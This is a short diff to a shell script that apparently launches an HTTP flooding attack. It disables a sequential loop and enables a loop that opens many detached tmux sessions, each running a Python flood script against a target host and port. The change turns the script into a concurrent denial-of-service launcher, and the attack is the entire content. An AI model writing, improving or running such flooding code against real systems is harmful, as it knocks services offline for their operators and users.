@@ -30,17 +30,16 @@ python3 $script $target -a $port -p $pack;
 # Async Terminal Sessions
 # 5 Flooding synchronously
 # Flooding with Tmux
-for ((i=0; i<$sessions; i++));
-do
-    python3 $script $target -a $port -p $pack;
-done
+# for ((i=0; i<$sessions; i++));
+# do
+#     python3 $script $target -a $port -p $pack;
+# done
 
 # Asynchronous / Concurrent HTTP requests flooding
 # Flood 1
-
-# for ((i=0; i<$sessions; i++));
-# do
-#     tmux new-session -d -s "session${i}" "python3 $script $target -a $port -p $pack";
-# done
+for ((i=0; i<$sessions; i++));
+do
+    tmux new-session -d -s "session${i}" "python3 $script $target -a $port -p $pack";
+done
 
 #echo "Packets: $pack have all been sent to target $target on port $port :D";
